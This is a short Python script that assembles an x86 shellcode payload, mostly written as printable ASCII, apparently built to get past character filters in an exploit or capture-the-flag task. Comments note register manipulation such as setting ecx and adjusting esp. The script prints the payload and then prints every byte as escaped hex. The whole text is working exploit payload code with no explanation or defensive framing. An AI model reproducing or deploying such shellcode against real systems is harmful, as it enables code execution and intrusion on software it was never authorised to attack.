shellcode = "\x21\x54\x24\x71"
shellcode += "PY" # ecx = eax
shellcode += "\x66\x35\x70\x23J\x21\x54\x24\x71JJ\x66\x35\x70\x21\x21\x54\x24\x71\x50\x5c\x21\x54\x24\x71" # esp = eax + 0x200
shellcode += "j0X40PPPPQPaJRX4Dj\x37Y0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx"
print(shellcode)


for c in shellcode:
    print("\\x{:02x}".format(ord(c)), end="")
